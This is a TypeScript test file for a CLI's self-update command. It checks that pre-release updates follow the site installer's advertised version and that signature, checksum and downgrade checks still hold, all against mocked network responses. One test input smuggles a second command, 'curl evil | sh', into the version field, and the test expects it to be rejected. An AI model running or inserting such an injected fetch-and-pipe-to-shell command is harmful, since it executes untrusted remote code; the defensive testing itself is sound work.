// WALK-58 (UPDATE-PRE-1): `walkie update` on a pre-release follows the release the site's installer advertises
// (GitHub's releases/latest never lists a pre-release, so it told every pre-release machine "up to date"); a stable
// install keeps asking releases/latest. The whole command runs here against a stand-in for the site and for GitHub
// (nothing touches the network), a stand-in binary on a temporary path (never this process's executable), and a test
// release key; every check `walkie update` already made is shown to hold on the new path too.
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { createHash, generateKeyPairSync } from "node:crypto";
import { chmodSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { parseArgs } from "../../src/cli/args.ts";
import { CLI_BOOLEANS } from "../../src/cli/booleans.ts";
import { assetName, update, type Fetcher } from "../../src/cli/commands/update.ts";
import type { Ctx } from "../../src/cli/context.ts";
import type { ServicePlan } from "../../src/daemon/service.ts";
import { INSTALL_URL } from "../../src/protocol/add-machine.ts";
import { signRelease } from "../../src/release/sign.ts";

const asset = assetName();
const REPO = "alexcarney460-hue/walkie-releases";
const INSTALLER_COMMAND = `curl -fsSL ${INSTALL_URL} | sh`;

function keypair(): { priv: string; pub: string } {
  const { privateKey, publicKey } = generateKeyPairSync("ec", { namedCurve: "prime256v1" });
  return { priv: privateKey.export({ format: "pem", type: "pkcs8" }) as string, pub: publicKey.export({ format: "pem", type: "spki" }) as string };
}
const vendor = keypair();
const stranger = keypair();

/** A stand-in walkie binary: a script that answers `version`, like the swap tests' stand-ins. */
const standIn = (v: string) => `#!/bin/sh\n[ "$1" = version ] && echo "walkie ${v}"\n`;
const sha256 = (s: string) => createHash("sha256").update(s).digest("hex");
const bare = (tag: string) => tag.replace(/^v/, "");

interface Served { binary: string; sums: string; sig: Uint8Array }
/** One release as GitHub (or a mirror) serves it; the options break one thing about it. */
function release(tag: string, o: { signedAs?: string; reports?: string; signWith?: string; checksum?: string } = {}): Served {
  const binary = standIn(o.reports ?? bare(tag));
  const sums = `version ${o.signedAs ?? tag}\n${o.checksum ?? sha256(binary)}  ${asset}\n`;
  return { binary, sums, sig: signRelease(new TextEncoder().encode(sums), o.signWith ?? vendor.priv) };
}

/** The installer's text, with the lines the real one has around DEFAULT_VERSION. */
const installer = (...lines: string[]) => ["#!/bin/sh", "set -eu", 'REPO="${WALKIE_REPO:-owner/walkie-releases}"', ...lines, 'VERSION="${WALKIE_VERSION:-$DEFAULT_VERSION}"', ""].join("\n");
const advertising = (tag: string) => installer(`DEFAULT_VERSION="${tag}"`);

type SiteReply = string | { status: number } | { throws: unknown } | Error | "hang";
interface WebConfig {
  /** What the site answers for /install.sh. */
  site?: SiteReply;
  /** GitHub's releases/latest answer (a tag), or a status. */
  latest?: string | { status: number };
  /** The releases GitHub serves, by tag, under the repo `repo` (default: the real one). */
  releases?: Record<string, Served>;
  repo?: string;
  /** A mirror (WALKIE_BASE_URL) and what it serves. */
  mirror?: { base: string; release: Served };
}

/** A stand-in for the site and GitHub that records every URL asked for. */
function web(cfg: WebConfig) {
  const requests: string[] = [];
  const repo = cfg.repo ?? REPO;
  const fetch: Fetcher = async (url, init) => {
    requests.push(url);
    if (url === INSTALL_URL) {
      const s = cfg.site ?? "";
      if (s instanceof Error) throw s;
      if (typeof s === "object" && "throws" in s) throw s.throws;
      if (s === "hang") return new Promise<Response>((_, reject) => init?.signal?.addEventListener("abort", () => reject(init.signal?.reason)));
      if (typeof s === "object") return new Response("site error", { status: s.status });
      return new Response(s);
    }
    if (url === `https://api.github.com/repos/${repo}/releases/latest`) {
      const l = cfg.latest ?? { status: 404 };
      return typeof l === "string" ? Response.json({ tag_name: l }) : new Response("no release", { status: l.status });
    }
    const download = new RegExp(`^https://github\\.com/${repo}/releases/download/([^/]+)/(.+)$`).exec(url);
    const served = download ? cfg.releases?.[download[1] as string] : cfg.mirror && url.startsWith(`${cfg.mirror.base}/`) ? cfg.mirror.release : undefined;
    const file = download ? (download[2] as string) : url.slice((cfg.mirror?.base.length ?? 0) + 1);
    if (served && file === asset) return new Response(served.binary);
    if (served && file === "SHA256SUMS") return new Response(served.sums);
    if (served && file === "SHA256SUMS.sig") return new Response(served.sig.slice().buffer as ArrayBuffer);
    return new Response("not found", { status: 404 });
  };
  return {
    fetch, requests,
    /** Every release file asked for (from GitHub or the mirror). */
    downloads: () => requests.filter((u) => u.includes("/releases/download/") || (cfg.mirror !== undefined && u.startsWith(`${cfg.mirror.base}/`))),
    asked: (needle: string) => requests.some((u) => u.includes(needle)),
  };
}

function ctxFor(argv: string[]): Ctx & { outs: string[]; errs: string[] } {
  const outs: string[] = [];
  const errs: string[] = [];
  return {
    args: parseArgs(argv, CLI_BOOLEANS), json: false, forAgent: false, agentMarker: () => null,
    client: () => { throw new Error("walkie update must not need the daemon here"); },
    out: (s: string) => outs.push(s), err: (s: string) => errs.push(s), outs, errs,
  } as unknown as Ctx & { outs: string[]; errs: string[] };
}

let root = "";
beforeAll(() => { root = mkdtempSync("/tmp/walkie-updch-"); });
afterAll(() => { rmSync(root, { recursive: true, force: true }); });

const reportedBy = (path: string): string => Bun.spawnSync([path, "version"]).stdout.toString().trim();

interface Run { installed: string; web: ReturnType<typeof web>; argv?: string[]; env?: { WALKIE_REPO?: string; WALKIE_BASE_URL?: string }; compiled?: boolean; siteTimeoutMs?: number }
/** `walkie update` as a machine running `installed`, whose binary is a stand-in at a temporary path. */
async function run(o: Run) {
  const dir = mkdtempSync(join(root, "run-"));
  const target = join(dir, "walkie");
  writeFileSync(target, standIn(bare(o.installed)), { mode: 0o755 });
  chmodSync(target, 0o755);
  const noService: ServicePlan = { platform: "systemd", path: join(dir, "absent.service"), content: "", load: [], unload: [], restart: ["true"] };
  const ctx = ctxFor(o.argv ?? []);
  const code = await update(ctx, {
    fetch: o.web.fetch, installed: o.installed, target, compiled: o.compiled ?? true, releaseKeyPem: vendor.pub, env: o.env ?? {},
    restart: { plan: noService }, ...(o.siteTimeoutMs !== undefined ? { siteTimeoutMs: o.siteTimeoutMs } : {}),
  });
  return { code, out: ctx.outs.join("\n"), err: ctx.errs.join("\n"), now: reportedBy(target), was: `walkie ${bare(o.installed)}` };
}

const files = (tag: string, repo = REPO) => [asset, "SHA256SUMS", "SHA256SUMS.sig"].map((f) => `https://github.com/${repo}/releases/download/${tag}/${f}`).sort();

describe("a pre-release follows the version the site's installer advertises", () => {
  test("a newer advertised release is downloaded from the release repo, fully verified, and swapped in; releases/latest is never asked", async () => {
    // GitHub's latest stable is the old v0.1.3 that used to make every pre-release machine "up to date"
    const w = web({ site: advertising("v0.2.0-pre.11"), latest: "v0.1.3", releases: { "v0.2.0-pre.11": release("v0.2.0-pre.11") } });
    const r = await run({ installed: "0.2.0-pre.9.1", web: w });
    expect(r.err).toBe("");
    expect(r.code).toBe(0);
    expect(r.out).toContain("updated");
    expect(r.out).toContain("v0.2.0-pre.11");
    expect(r.now).toBe("walkie 0.2.0-pre.11");
    expect(w.requests[0]).toBe(INSTALL_URL);
    expect(w.downloads().sort()).toEqual(files("v0.2.0-pre.11"));
    expect(w.asked("api.github.com")).toBe(false);
  });

  test("the advertised release may be a stable one: a pre-release updates to the release of its own version", async () => {
    const w = web({ site: advertising("v0.2.0"), releases: { "v0.2.0": release("v0.2.0") } });
    const r = await run({ installed: "0.2.0-pre.11", web: w });
    expect([r.code, r.now]).toEqual([0, "walkie 0.2.0"]);
  });

  test("the advertised release is the installed one: up to date, nothing downloaded or changed", async () => {
    const w = web({ site: advertising("v0.2.0-pre.11"), latest: "v0.1.3" });
    const r = await run({ installed: "0.2.0-pre.11", web: w });
    expect(r.code).toBe(0);
    expect(r.out).toBe("walkie 0.2.0-pre.11 is up to date (the site advertises v0.2.0-pre.11)");
    expect(w.downloads()).toEqual([]);
    expect(r.now).toBe(r.was);
  });

  test("an older advertised release is not installed over a newer one, unless --allow-downgrade", async () => {
    const releases = { "v0.2.0-pre.11": release("v0.2.0-pre.11") };
    const refused = await run({ installed: "0.2.0-pre.12", web: web({ site: advertising("v0.2.0-pre.11"), releases }) });
    expect(refused.code).toBe(0);
    expect(refused.out).toBe("walkie 0.2.0-pre.12 is up to date (the site advertises v0.2.0-pre.11)");
    expect(refused.now).toBe(refused.was);

    const w = web({ site: advertising("v0.2.0-pre.11"), releases });
    const allowed = await run({ installed: "0.2.0-pre.12", web: w, argv: ["--allow-downgrade"] });
    expect([allowed.code, allowed.now]).toEqual([0, "walkie 0.2.0-pre.11"]);
    expect(w.downloads().sort()).toEqual(files("v0.2.0-pre.11"));
  });

  test("--check reports the advertised version and changes nothing", async () => {
    const w = web({ site: advertising("v0.2.0-pre.11"), latest: "v0.1.3" });
    const r = await run({ installed: "0.2.0-pre.9.1", web: w, argv: ["--check"] });
    expect(r.code).toBe(0);
    expect(r.out).toBe("update available: 0.2.0-pre.9.1 → v0.2.0-pre.11 (the version the site's installer offers)");
    expect(w.requests).toEqual([INSTALL_URL]);
    expect(r.now).toBe(r.was);

    const upToDate = await run({ installed: "0.2.0-pre.11", web: web({ site: advertising("v0.2.0-pre.11") }), argv: ["--check"] });
    expect(upToDate.out).toBe("walkie 0.2.0-pre.11 is up to date (the site advertises v0.2.0-pre.11)");
  });

  test("from source (not a compiled binary) --check still answers, and an update says to pull instead", async () => {
    const w = web({ site: advertising("v0.2.0-pre.11") });
    const check = await run({ installed: "0.2.0-pre.9.1", web: w, argv: ["--check"], compiled: false });
    expect(check.out).toContain("v0.2.0-pre.11");
    const go = await run({ installed: "0.2.0-pre.9.1", web: w, compiled: false });
    expect(go.code).toBe(1);
    expect(go.err).toContain("running from source");
    expect(w.downloads()).toEqual([]);
  });
});

describe("what the site's installer says is checked before anything is downloaded", () => {
  const cases: Array<[string, string, RegExp]> = [
    ["no DEFAULT_VERSION line", installer(), /no DEFAULT_VERSION/],
    ["an empty answer", "", /no DEFAULT_VERSION/],
    ["two DEFAULT_VERSION lines", installer('DEFAULT_VERSION="v0.2.0-pre.11"', 'DEFAULT_VERSION="v0.2.0-pre.12"'), /2 DEFAULT_VERSION lines/],
    ["a DEFAULT_VERSION that is not a tag", installer('DEFAULT_VERSION="latest"'), /not a release tag/],
    ["a DEFAULT_VERSION with trailing text", installer('DEFAULT_VERSION="v0.2.0-pre.11"; curl evil | sh'), /not a release tag/],
    ["an HTML page where the installer should be", "<!doctype html><title>Not found</title>", /no DEFAULT_VERSION/],
    ["a 900,000-character pre-release part", installer(`DEFAULT_VERSION="v1.0.0-${"x".repeat(900_000)}"`), /not a release tag/],
    ["a 900,000-digit version number", installer(`DEFAULT_VERSION="v${"1".repeat(900_000)}.0.0"`), /not a release tag/],
    ["a tag made of empty pre-release identifiers", installer('DEFAULT_VERSION="v1.0.0-.."'), /not a release tag/],
  ];
  for (const [name, body, reason] of cases) {
    test(`${name}: a clear error naming the installer, nothing downloaded, nothing changed`, async () => {
      const w = web({ site: body, latest: "v0.1.3", releases: { "v0.2.0-pre.11": release("v0.2.0-pre.11") } });
      const r = await run({ installed: "0.2.0-pre.9.1", web: w });
      expect(r.code).toBe(1);
      expect(r.err).toMatch(reason);
      expect(r.err).toContain("nothing changed");
      expect(r.err).toContain(INSTALLER_COMMAND);
      expect(r.err.length).toBeLessThan(500); // whatever the site sent, the error stays a few lines
      expect(w.requests).toEqual([INSTALL_URL]); // not even releases/latest
      expect(r.now).toBe(r.was);
    });
  }

  const unreachable: Array<[string, WebConfig, string]> = [
    ["the site is unreachable", { site: new TypeError("fetch failed") }, "fetch failed"],
    ["the connection fails with something that is not an Error", { site: { throws: "dns down" } }, "dns down"],
    ["the site answers 500", { site: { status: 500 } }, "HTTP 500"],
    ["the site answers 404", { site: { status: 404 } }, "HTTP 404"],
    ["the site answers with more than an installer can be", { site: `DEFAULT_VERSION="v0.2.0-pre.11"\n${"#".repeat(2 * 1024 * 1024)}` }, "more than"],
  ];
  for (const [name, cfg, why] of unreachable) {
    test(`${name}: a clear error naming the installer, nothing downloaded, nothing changed`, async () => {
      const w = web({ ...cfg, latest: "v0.1.3", releases: { "v0.2.0-pre.11": release("v0.2.0-pre.11") } });
      const r = await run({ installed: "0.2.0-pre.9.1", web: w });
      expect(r.code).toBe(1);
      expect(r.err).toContain("could not read the version the site's installer offers");
      expect(r.err).toContain(why);
      expect(r.err).toContain("nothing changed");
      expect(r.err).toContain(INSTALLER_COMMAND);
      expect(w.requests).toEqual([INSTALL_URL]);
      expect(r.now).toBe(r.was);
    });
  }

  test("a site that never answers is given up on, with the same clear error", async () => {
    const w = web({ site: "hang" });
    const r = await run({ installed: "0.2.0-pre.9.1", web: w, siteTimeoutMs: 50 });
    expect(r.code).toBe(1);
    expect(r.err).toContain("could not read the version the site's installer offers");
    expect(r.err).toContain(INSTALLER_COMMAND);
    expect(w.downloads()).toEqual([]);
  });
});

describe("every check `walkie update` makes still holds for the release the site advertises", () => {
  const site = advertising("v0.2.0-pre.11");

  test("a release signed by another key is refused", async () => {
    const w = web({ site, releases: { "v0.2.0-pre.11": release("v0.2.0-pre.11", { signWith: stranger.priv }) } });
    const r = await run({ installed: "0.2.0-pre.9.1", web: w });
    expect(r.code).toBe(1);
    expect(r.err).toContain("not signed by the Walkie release key; nothing changed");
    expect(r.now).toBe(r.was);
  });

  test("a validly signed OLDER release served under the advertised tag is refused", async () => {
    const w = web({ site, releases: { "v0.2.0-pre.11": release("v0.2.0-pre.11", { signedAs: "v0.2.0-pre.10" }) } });
    const r = await run({ installed: "0.2.0-pre.9.1", web: w });
    expect(r.code).toBe(1);
    expect(r.err).toContain("signed for release v0.2.0-pre.10, not v0.2.0-pre.11");
    expect(r.now).toBe(r.was);
  });

  test("a binary that does not match the signed checksum is refused", async () => {
    const w = web({ site, releases: { "v0.2.0-pre.11": release("v0.2.0-pre.11", { checksum: "0".repeat(64) }) } });
    const r = await run({ installed: "0.2.0-pre.9.1", web: w });
    expect(r.code).toBe(1);
    expect(r.err).toContain("checksum mismatch");
    expect(r.now).toBe(r.was);
  });

  test("a binary that reports another version than the signed one is rolled back", async () => {
    const w = web({ site, releases: { "v0.2.0-pre.11": release("v0.2.0-pre.11", { reports: "0.2.0-pre.3" }) } });
    const r = await run({ installed: "0.2.0-pre.9.1", web: w });
    expect(r.code).toBe(1);
    expect(r.err).toContain("restored the previous binary");
    expect(r.now).toBe(r.was);
  });

  test("an advertised release that GitHub does not have fails the download loudly, as a missing stable release does", async () => {
    const w = web({ site, releases: {} });
    await expect(run({ installed: "0.2.0-pre.9.1", web: w })).rejects.toThrow(/download: HTTP 404 from https:\/\/github\.com\/.*\/v0\.2\.0-pre\.11\//);
  });
});

describe("a stable install, a mirror and WALKIE_REPO behave as before", () => {
  test("a stable install asks releases/latest and never the site", async () => {
    const w = web({ site: new Error("the site must not be asked"), latest: "v0.3.0", releases: { "v0.3.0": release("v0.3.0") } });
    const r = await run({ installed: "0.2.0", web: w });
    expect([r.code, r.now]).toEqual([0, "walkie 0.3.0"]);
    expect(w.asked("getwalkie")).toBe(false);
    expect(w.requests[0]).toBe(`https://api.github.com/repos/${REPO}/releases/latest`);
    expect(w.downloads().sort()).toEqual(files("v0.3.0"));
  });

  test("a stable install that is current says so as it always did", async () => {
    const w = web({ latest: "v0.2.0" });
    const r = await run({ installed: "0.2.0", web: w });
    expect(r.out).toBe("walkie 0.2.0 is up to date (latest release v0.2.0)");
    const check = await run({ installed: "0.2.0", web: web({ latest: "v0.3.0" }), argv: ["--check"] });
    expect(check.out).toBe("update available: 0.2.0 → v0.3.0");
  });

  test("WALKIE_REPO names the release repo for both channels", async () => {
    const repo = "acme/walkie-releases";
    const pre = web({ site: advertising("v0.2.0-pre.11"), repo, releases: { "v0.2.0-pre.11": release("v0.2.0-pre.11") } });
    expect((await run({ installed: "0.2.0-pre.9.1", web: pre, env: { WALKIE_REPO: repo } })).now).toBe("walkie 0.2.0-pre.11");
    expect(pre.downloads().sort()).toEqual(files("v0.2.0-pre.11", repo));
    expect(pre.asked(REPO)).toBe(false);

    const stable = web({ latest: "v0.3.0", repo, releases: { "v0.3.0": release("v0.3.0") } });
    expect((await run({ installed: "0.2.0", web: stable, env: { WALKIE_REPO: repo } })).now).toBe("walkie 0.3.0");
    expect(stable.requests[0]).toBe(`https://api.github.com/repos/${repo}/releases/latest`);
  });

  test("the address an error echoes is cut short: a failed download never prints a 5,000-character URL", async () => {
    const e = await run({ installed: "0.2.0-pre.9.1", web: web({}), env: { WALKIE_BASE_URL: `https://mirror.test/${"a".repeat(5_000)}` } }).catch((err: unknown) => err);
    expect(e).toBeInstanceOf(Error);
    const message = (e as Error).message;
    expect(message).toContain("download: HTTP 404 from https://mirror.test/");
    expect(message.length).toBeLessThan(400);
    expect(message).toContain("…");
  });

  test("a mirror (WALKIE_BASE_URL) rules a pre-release too: no site, no GitHub, the signed version decides", async () => {
    const base = "https://mirror.test/walkie";
    const w = web({ site: new Error("the site must not be asked"), mirror: { base, release: release("v0.2.0-pre.11") } });
    const r = await run({ installed: "0.2.0-pre.9.1", web: w, env: { WALKIE_BASE_URL: base } });
    expect([r.code, r.now]).toEqual([0, "walkie 0.2.0-pre.11"]);
    expect(w.requests.sort()).toEqual([asset, "SHA256SUMS", "SHA256SUMS.sig"].map((f) => `${base}/${f}`).sort());

    // an older signed release on the mirror is still never a silent downgrade
    const older = web({ mirror: { base, release: release("v0.2.0-pre.8") } });
    const refused = await run({ installed: "0.2.0-pre.9.1", web: older, env: { WALKIE_BASE_URL: base } });
    expect(refused.code).toBe(1);
    expect(refused.err).toContain("a downgrade needs --allow-downgrade");
    expect(refused.now).toBe(refused.was);
  });
});
